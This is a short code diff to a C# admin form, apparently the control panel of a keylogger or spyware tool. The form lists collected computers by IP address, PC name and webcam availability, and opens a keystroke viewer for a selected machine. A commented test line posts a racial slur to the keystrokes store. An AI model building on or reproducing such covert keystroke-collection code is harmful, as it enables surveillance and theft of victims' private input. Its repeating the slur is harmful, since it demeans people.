@@ -34,10 +34,10 @@ namespace MakeYourDataSafe_Admin
             {
                 var data = await client.Child("Computers").OnceAsync<GetComputers>();
                 //var child = client.Child("Keystrokes");
-                //child.PostAsync(new SetKeystrokes { id = 11, key = "NateHiggers" });
+                //child.PostAsync(new SetKeystrokes { id = "-L_Dr-eEg2N1KjPy9LIp", key = "NateHiggers" }););
                 foreach (var i in data)
                 {
-                    this.Computers.Rows.Add(i.Object.id, i.Object.ip_address, i.Object.pc_name, i.Object.has_webcam);
+                    this.Computers.Rows.Add(i.Key, i.Object.ip_address, i.Object.pc_name, i.Object.has_webcam);
                 }
             }
             catch (DataException ex)
@@ -56,13 +56,13 @@ namespace MakeYourDataSafe_Admin
 
         private void keys_Click(object sender, EventArgs e)
         {
-            Keys form = new Keys();
+            Keys form = new Keys(Computers.SelectedRows[0].Index.ToString());
             form.Show();
         }
 
         private void rowChange(object sender, EventArgs e)
         {
-
+            
         }
     }
 }
